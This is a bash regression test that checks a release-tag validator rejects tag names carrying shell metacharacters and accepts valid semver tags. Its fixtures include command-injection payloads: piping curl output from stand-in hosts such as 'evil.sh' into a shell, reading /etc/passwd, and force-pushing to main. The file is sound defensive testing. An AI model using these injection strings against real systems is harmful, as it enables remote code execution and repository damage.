#!/usr/bin/env bash
# validate-release-tag-test.sh — S-003 regression test.
#
# A tag name containing shell metacharacters must be rejected BEFORE it
# can reach any shell command. Fixtures here mirror what a specially-
# named pushed tag could look like; every one must exit non-zero.
# Valid semver tags must pass.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
VALIDATE="$ROOT/scripts/validate-release-tag.sh"

fail() { echo "FAIL: $*" >&2; exit 1; }

reject() { # $1 = tag name fixture; must be rejected (exit 1)
  if bash "$VALIDATE" "$1" >/dev/null 2>&1; then
    fail "metacharacter tag '$1' was ACCEPTED"
  fi
}

accept() { # $1 = tag name; must pass (exit 0)
  if ! bash "$VALIDATE" "$1" >/dev/null 2>&1; then
    fail "valid tag '$1' was REJECTED"
  fi
}

# --- injection payloads / shell metacharacters must be rejected ---
reject 'v1.0;touch /tmp/pwned'
reject 'v1.0$(id)'
reject 'v1.0$(curl evil.sh|bash)'
reject 'v1.0`touch /tmp/pwned`'
reject 'v1.0|cat /etc/passwd'
reject 'v1.0&&echo owned'
reject 'v1.0 & true'
reject 'v1.0"touch /tmp/x"'
reject "v1.0'touch /tmp/x'"
reject 'v1.0\$(id)'
reject 'v1.0;git push -f origin main'
reject 'v1.0.1;echo PWNED >&2'
reject 'v1.0.1$(curl -k https://evil/x|sh)'

# --- malformed / out-of-pattern names must be rejected ---
reject 'v1.0.1-junk'
reject 'v1.0.1.2'
reject 'v1.0.1 '
reject 'v 1.0.1'
reject 'v1.0.1\n'
reject '1.0.1'
reject 'V1.0.1'
reject 'v1.0'
reject 'v1'
reject 'v1.0.a'
reject 'v0.0.0-alpha'
reject ''

# --- valid names must pass ---
accept 'v1.0.0'
accept 'v0.0.1'
accept 'v0.2.5'
accept 'v12.34.567'

echo "S-003-RELEASE-TAG-GUARD-PASS"
